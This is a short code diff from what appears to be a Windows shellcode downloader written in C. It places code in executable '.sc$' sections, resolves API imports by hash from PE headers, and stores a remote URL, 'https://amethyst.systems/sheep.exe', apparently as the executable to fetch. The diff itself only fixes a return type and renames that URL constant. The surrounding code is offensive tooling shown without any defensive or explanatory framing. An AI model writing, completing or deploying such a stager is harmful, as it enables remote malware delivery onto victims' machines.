@@ -69,7 +69,7 @@ __declspec(code_seg(".sc$001"), naked) IAT *iat(void) {
 __declspec(allocate(".sc$002")) IAT IMPORT_TABLE = {NULL, NULL, NULL};
 
 #pragma section(".sc$003", read, execute)
-__declspec(code_seg(".sc$003")) get_import_by_hash(uint8_t *module, uint32_t hash) {
+__declspec(code_seg(".sc$003")) uint8_t *get_import_by_hash(uint8_t *module, uint32_t hash) {
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)module;
 #if defined(_M_AMD64)
    PIMAGE_NT_HEADERS64 nt_headers = (PIMAGE_NT_HEADERS64)&module[dos_header->e_lfanew];
@@ -157,4 +157,4 @@ __declspec(code_seg(".sc$006"), naked) char *target_url(void) {
 #endif
 
 #pragma section(".sc$007", read, execute)
-__declspec(allocate(".sc$007")) char TARGET_FILENAME[] = "https://amethyst.systems/sheep.exe";
+__declspec(allocate(".sc$007")) char TARGET_URL[] = "https://amethyst.systems/sheep.exe";
